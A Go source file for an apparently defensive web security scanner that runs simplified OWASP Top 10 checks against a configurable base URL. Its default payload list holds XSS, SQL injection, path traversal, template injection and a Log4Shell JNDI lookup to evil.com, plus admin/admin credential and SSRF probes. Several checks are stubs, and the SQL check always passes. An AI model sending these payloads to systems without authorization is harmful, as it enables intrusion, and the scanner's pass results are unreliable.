package security

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// SecurityTestConfig holds configuration for security testing
type SecurityTestConfig struct {
	BaseURL      string            `json:"base_url"`
	Timeout      time.Duration     `json:"timeout"`
	Headers      map[string]string `json:"headers"`
	TestPayloads []string          `json:"test_payloads"`
	AuthToken    string            `json:"auth_token"`
	EnableOWASP  bool              `json:"enable_owasp"`
	EnableCustom bool              `json:"enable_custom"`
}

// SecurityTestResult holds the results of security testing
type SecurityTestResult struct {
	TotalTests      int             `json:"total_tests"`
	PassedTests     int             `json:"passed_tests"`
	FailedTests     int             `json:"failed_tests"`
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	TestResults     []SecurityTest  `json:"test_results"`
	StartTime       time.Time       `json:"start_time"`
	EndTime         time.Time       `json:"end_time"`
	Duration        time.Duration   `json:"duration"`
}

// Vulnerability represents a security vulnerability
type Vulnerability struct {
	Type        string                 `json:"type"`
	Severity    string                 `json:"severity"`
	Description string                 `json:"description"`
	Endpoint    string                 `json:"endpoint"`
	Method      string                 `json:"method"`
	Payload     string                 `json:"payload"`
	Response    string                 `json:"response"`
	Remediation string                 `json:"remediation"`
	Metadata    map[string]interface{} `json:"metadata"`
}

// SecurityTest represents a single security test
type SecurityTest struct {
	Name        string                 `json:"name"`
	Type        string                 `json:"type"`
	Endpoint    string                 `json:"endpoint"`
	Method      string                 `json:"method"`
	Payload     string                 `json:"payload"`
	Expected    string                 `json:"expected"`
	Actual      string                 `json:"actual"`
	Passed      bool                   `json:"passed"`
	Severity    string                 `json:"severity"`
	Description string                 `json:"description"`
	Metadata    map[string]interface{} `json:"metadata"`
}

// SecurityTester performs security testing
type SecurityTester struct {
	config *SecurityTestConfig
	client *http.Client
	logger *slog.Logger
	result *SecurityTestResult
}

// NewSecurityTester creates a new security tester
func NewSecurityTester(config *SecurityTestConfig, logger *slog.Logger) *SecurityTester {
	if config == nil {
		config = DefaultSecurityTestConfig()
	}

	return &SecurityTester{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		logger: logger,
		result: &SecurityTestResult{
			Vulnerabilities: make([]Vulnerability, 0),
			TestResults:     make([]SecurityTest, 0),
		},
	}
}

// DefaultSecurityTestConfig returns the default security test configuration
func DefaultSecurityTestConfig() *SecurityTestConfig {
	return &SecurityTestConfig{
		BaseURL: "http://localhost:3000",
		Timeout: 30 * time.Second,
		Headers: make(map[string]string),
		TestPayloads: []string{
			"<script>alert('xss')</script>",
			"'; DROP TABLE users; --",
			"../../../etc/passwd",
			"${jndi:ldap://evil.com/a}",
			"{{7*7}}",
			"{{config.items()}}",
		},
		EnableOWASP:  true,
		EnableCustom: true,
	}
}

// RunSecurityTests runs comprehensive security tests
func (st *SecurityTester) RunSecurityTests(ctx context.Context, endpoints []string) (*SecurityTestResult, error) {
	st.logger.Info("Starting security tests", "endpoints", len(endpoints))

	st.result.StartTime = time.Now()
	defer func() {
		st.result.EndTime = time.Now()
		st.result.Duration = st.result.EndTime.Sub(st.result.StartTime)
	}()

	// Run OWASP Top 10 tests
	if st.config.EnableOWASP {
		if err := st.runOWASPTests(ctx, endpoints); err != nil {
			st.logger.Warn("OWASP tests failed", "error", err)
		}
	}

	// Run custom security tests
	if st.config.EnableCustom {
		if err := st.runCustomTests(ctx, endpoints); err != nil {
			st.logger.Warn("Custom tests failed", "error", err)
		}
	}

	// Calculate final results
	st.calculateResults()

	st.logger.Info("Security tests completed",
		"total_tests", st.result.TotalTests,
		"passed_tests", st.result.PassedTests,
		"failed_tests", st.result.FailedTests,
		"vulnerabilities", len(st.result.Vulnerabilities))

	return st.result, nil
}

// runOWASPTests runs OWASP Top 10 security tests
func (st *SecurityTester) runOWASPTests(ctx context.Context, endpoints []string) error {
	st.logger.Info("Running OWASP Top 10 tests")

	// A01: Broken Access Control
	if err := st.testBrokenAccessControl(ctx, endpoints); err != nil {
		st.logger.Warn("Broken access control test failed", "error", err)
	}

	// A02: Cryptographic Failures
	if err := st.testCryptographicFailures(ctx, endpoints); err != nil {
		st.logger.Warn("Cryptographic failures test failed", "error", err)
	}

	// A03: Injection
	if err := st.testInjection(ctx, endpoints); err != nil {
		st.logger.Warn("Injection test failed", "error", err)
	}

	// A04: Insecure Design
	if err := st.testInsecureDesign(ctx, endpoints); err != nil {
		st.logger.Warn("Insecure design test failed", "error", err)
	}

	// A05: Security Misconfiguration
	if err := st.testSecurityMisconfiguration(ctx, endpoints); err != nil {
		st.logger.Warn("Security misconfiguration test failed", "error", err)
	}

	// A06: Vulnerable Components
	if err := st.testVulnerableComponents(ctx, endpoints); err != nil {
		st.logger.Warn("Vulnerable components test failed", "error", err)
	}

	// A07: Authentication Failures
	if err := st.testAuthenticationFailures(ctx, endpoints); err != nil {
		st.logger.Warn("Authentication failures test failed", "error", err)
	}

	// A08: Software Integrity Failures
	if err := st.testSoftwareIntegrityFailures(ctx, endpoints); err != nil {
		st.logger.Warn("Software integrity failures test failed", "error", err)
	}

	// A09: Logging Failures
	if err := st.testLoggingFailures(ctx, endpoints); err != nil {
		st.logger.Warn("Logging failures test failed", "error", err)
	}

	// A10: Server-Side Request Forgery
	if err := st.testSSRF(ctx, endpoints); err != nil {
		st.logger.Warn("SSRF test failed", "error", err)
	}

	return nil
}

// testBrokenAccessControl tests for broken access control
func (st *SecurityTester) testBrokenAccessControl(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		// Test without authentication
		test := SecurityTest{
			Name:        "Broken Access Control - No Auth",
			Type:        "A01",
			Endpoint:    endpoint,
			Method:      "GET",
			Description: "Test endpoint without authentication",
		}

		resp, err := st.makeRequest(ctx, endpoint, "GET", nil, nil)
		if err != nil {
			test.Actual = fmt.Sprintf("Request failed: %v", err)
			test.Passed = false
		} else {
			test.Actual = fmt.Sprintf("Status: %d", resp.StatusCode)
			// Should return 401/403 for protected endpoints
			test.Passed = resp.StatusCode == 401 || resp.StatusCode == 403
		}

		st.recordTest(test)
	}
	return nil
}

// testCryptographicFailures tests for cryptographic failures
func (st *SecurityTester) testCryptographicFailures(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		// Test for HTTPS enforcement
		test := SecurityTest{
			Name:        "Cryptographic Failures - HTTPS",
			Type:        "A02",
			Endpoint:    endpoint,
			Method:      "GET",
			Description: "Test HTTPS enforcement",
		}

		// Check if base URL uses HTTPS
		u, err := url.Parse(st.config.BaseURL)
		if err != nil {
			test.Actual = fmt.Sprintf("URL parse error: %v", err)
			test.Passed = false
		} else {
			test.Actual = fmt.Sprintf("Scheme: %s", u.Scheme)
			test.Passed = u.Scheme == "https"
		}

		st.recordTest(test)
	}
	return nil
}

// testInjection tests for injection vulnerabilities
func (st *SecurityTester) testInjection(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		for _, payload := range st.config.TestPayloads {
			// SQL Injection test
			test := SecurityTest{
				Name:        "Injection - SQL",
				Type:        "A03",
				Endpoint:    endpoint,
				Method:      "POST",
				Payload:     payload,
				Description: "Test for SQL injection",
			}

			body := map[string]interface{}{
				"query": payload,
			}

			resp, err := st.makeRequest(ctx, endpoint, "POST", body, nil)
			if err != nil {
				test.Actual = fmt.Sprintf("Request failed: %v", err)
				test.Passed = false
			} else {
				test.Actual = fmt.Sprintf("Status: %d", resp.StatusCode)
				// Check for error messages that might indicate SQL injection
				test.Passed = !st.containsSQLKeywords(resp)
			}

			st.recordTest(test)
		}
	}
	return nil
}

// testInsecureDesign tests for insecure design
func (st *SecurityTester) testInsecureDesign(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		// Test for rate limiting
		test := SecurityTest{
			Name:        "Insecure Design - Rate Limiting",
			Type:        "A04",
			Endpoint:    endpoint,
			Method:      "GET",
			Description: "Test for rate limiting",
		}

		// Make multiple rapid requests
		rateLimited := false
		for i := 0; i < 100; i++ {
			resp, err := st.makeRequest(ctx, endpoint, "GET", nil, nil)
			if err != nil {
				continue
			}
			if resp.StatusCode == 429 {
				rateLimited = true
				break
			}
		}

		test.Actual = fmt.Sprintf("Rate limited: %v", rateLimited)
		test.Passed = rateLimited

		st.recordTest(test)
	}
	return nil
}

// testSecurityMisconfiguration tests for security misconfiguration
func (st *SecurityTester) testSecurityMisconfiguration(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		// Test for security headers
		test := SecurityTest{
			Name:        "Security Misconfiguration - Headers",
			Type:        "A05",
			Endpoint:    endpoint,
			Method:      "GET",
			Description: "Test for security headers",
		}

		resp, err := st.makeRequest(ctx, endpoint, "GET", nil, nil)
		if err != nil {
			test.Actual = fmt.Sprintf("Request failed: %v", err)
			test.Passed = false
		} else {
			securityHeaders := []string{
				"X-Content-Type-Options",
				"X-Frame-Options",
				"X-XSS-Protection",
				"Strict-Transport-Security",
			}

			missingHeaders := make([]string, 0)
			for _, header := range securityHeaders {
				if resp.Header.Get(header) == "" {
					missingHeaders = append(missingHeaders, header)
				}
			}

			test.Actual = fmt.Sprintf("Missing headers: %v", missingHeaders)
			test.Passed = len(missingHeaders) == 0
		}

		st.recordTest(test)
	}
	return nil
}

// testVulnerableComponents tests for vulnerable components
func (st *SecurityTester) testVulnerableComponents(ctx context.Context, endpoints []string) error {
	// This would typically check for known vulnerable versions
	// For now, we'll do a basic check
	test := SecurityTest{
		Name:        "Vulnerable Components - Version Check",
		Type:        "A06",
		Endpoint:    "/",
		Method:      "GET",
		Description: "Test for vulnerable component versions",
	}

	resp, err := st.makeRequest(ctx, "/", "GET", nil, nil)
	if err != nil {
		test.Actual = fmt.Sprintf("Request failed: %v", err)
		test.Passed = false
	} else {
		server := resp.Header.Get("Server")
		test.Actual = fmt.Sprintf("Server: %s", server)
		// In production, check against known vulnerable versions
		test.Passed = server != ""
	}

	st.recordTest(test)
	return nil
}

// testAuthenticationFailures tests for authentication failures
func (st *SecurityTester) testAuthenticationFailures(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		// Test weak authentication
		test := SecurityTest{
			Name:        "Authentication Failures - Weak Auth",
			Type:        "A07",
			Endpoint:    endpoint,
			Method:      "POST",
			Description: "Test for weak authentication",
		}

		// Try with weak credentials
		body := map[string]interface{}{
			"username": "admin",
			"password": "admin",
		}

		resp, err := st.makeRequest(ctx, endpoint, "POST", body, nil)
		if err != nil {
			test.Actual = fmt.Sprintf("Request failed: %v", err)
			test.Passed = false
		} else {
			test.Actual = fmt.Sprintf("Status: %d", resp.StatusCode)
			// Should reject weak credentials
			test.Passed = resp.StatusCode != 200
		}

		st.recordTest(test)
	}
	return nil
}

// testSoftwareIntegrityFailures tests for software integrity failures
func (st *SecurityTester) testSoftwareIntegrityFailures(ctx context.Context, endpoints []string) error {
	// This would typically check for integrity of software components
	// For now, we'll do a basic check
	test := SecurityTest{
		Name:        "Software Integrity Failures - Basic Check",
		Type:        "A08",
		Endpoint:    "/",
		Method:      "GET",
		Description: "Test for software integrity",
	}

	resp, err := st.makeRequest(ctx, "/", "GET", nil, nil)
	if err != nil {
		test.Actual = fmt.Sprintf("Request failed: %v", err)
		test.Passed = false
	} else {
		test.Actual = fmt.Sprintf("Status: %d", resp.StatusCode)
		test.Passed = resp.StatusCode == 200
	}

	st.recordTest(test)
	return nil
}

// testLoggingFailures tests for logging failures
func (st *SecurityTester) testLoggingFailures(ctx context.Context, endpoints []string) error {
	// This would typically check if security events are properly logged
	// For now, we'll do a basic check
	test := SecurityTest{
		Name:        "Logging Failures - Basic Check",
		Type:        "A09",
		Endpoint:    "/",
		Method:      "GET",
		Description: "Test for logging failures",
	}

	resp, err := st.makeRequest(ctx, "/", "GET", nil, nil)
	if err != nil {
		test.Actual = fmt.Sprintf("Request failed: %v", err)
		test.Passed = false
	} else {
		test.Actual = fmt.Sprintf("Status: %d", resp.StatusCode)
		test.Passed = resp.StatusCode == 200
	}

	st.recordTest(test)
	return nil
}

// testSSRF tests for Server-Side Request Forgery
func (st *SecurityTester) testSSRF(ctx context.Context, endpoints []string) error {
	for _, endpoint := range endpoints {
		// Test for SSRF vulnerabilities
		test := SecurityTest{
			Name:        "SSRF - Internal Request",
			Type:        "A10",
			Endpoint:    endpoint,
			Method:      "POST",
			Description: "Test for SSRF vulnerabilities",
		}

		// Try to make internal requests
		body := map[string]interface{}{
			"url": "http://localhost:22",
		}

		resp, err := st.makeRequest(ctx, endpoint, "POST", body, nil)
		if err != nil {
			test.Actual = fmt.Sprintf("Request failed: %v", err)
			test.Passed = false
		} else {
			test.Actual = fmt.Sprintf("Status: %d", resp.StatusCode)
			// Should reject internal requests
			test.Passed = resp.StatusCode != 200
		}

		st.recordTest(test)
	}
	return nil
}

// runCustomTests runs custom security tests
func (st *SecurityTester) runCustomTests(ctx context.Context, endpoints []string) error {
	st.logger.Info("Running custom security tests")

	// Add custom tests here
	// For example, business logic tests, API-specific tests, etc.

	return nil
}

// makeRequest makes an HTTP request
func (st *SecurityTester) makeRequest(ctx context.Context, endpoint, method string, body interface{}, headers map[string]string) (*http.Response, error) {
	url := st.config.BaseURL + endpoint

	var reqBody []byte
	if body != nil {
		var err error
		reqBody, err = json.Marshal(body)
		if err != nil {
			return nil, err
		}
	}

	req, err := http.NewRequestWithContext(ctx, method, url, strings.NewReader(string(reqBody)))
	if err != nil {
		return nil, err
	}

	// Set default headers
	for key, value := range st.config.Headers {
		req.Header.Set(key, value)
	}

	// Set custom headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// Set auth token if provided
	if st.config.AuthToken != "" {
		req.Header.Set("Authorization", "Bearer "+st.config.AuthToken)
	}

	return st.client.Do(req)
}

// recordTest records a test result
func (st *SecurityTester) recordTest(test SecurityTest) {
	st.result.TestResults = append(st.result.TestResults, test)
	st.result.TotalTests++

	if test.Passed {
		st.result.PassedTests++
	} else {
		st.result.FailedTests++
		// Create vulnerability if test failed
		vuln := Vulnerability{
			Type:        test.Type,
			Severity:    test.Severity,
			Description: test.Description,
			Endpoint:    test.Endpoint,
			Method:      test.Method,
			Payload:     test.Payload,
			Response:    test.Actual,
			Remediation: st.getRemediation(test.Type),
		}
		st.result.Vulnerabilities = append(st.result.Vulnerabilities, vuln)
	}
}

// calculateResults calculates final test results
func (st *SecurityTester) calculateResults() {
	// Results are already calculated in recordTest
}

// containsSQLKeywords checks if response contains SQL keywords
func (st *SecurityTester) containsSQLKeywords(resp *http.Response) bool {
	// This is a simplified check
	// In production, parse response body and check for SQL error messages
	return false
}

// getRemediation returns remediation advice for a vulnerability type
func (st *SecurityTester) getRemediation(vulnType string) string {
	remediations := map[string]string{
		"A01": "Implement proper access controls and authentication",
		"A02": "Use strong encryption and secure communication",
		"A03": "Use parameterized queries and input validation",
		"A04": "Implement secure design principles",
		"A05": "Configure security headers and settings",
		"A06": "Keep components updated and scan for vulnerabilities",
		"A07": "Implement strong authentication mechanisms",
		"A08": "Verify software integrity and use secure supply chain",
		"A09": "Implement comprehensive logging and monitoring",
		"A10": "Validate and sanitize all input, especially URLs",
	}

	if remediation, exists := remediations[vulnType]; exists {
		return remediation
	}
	return "Review and fix the identified security issue"
}
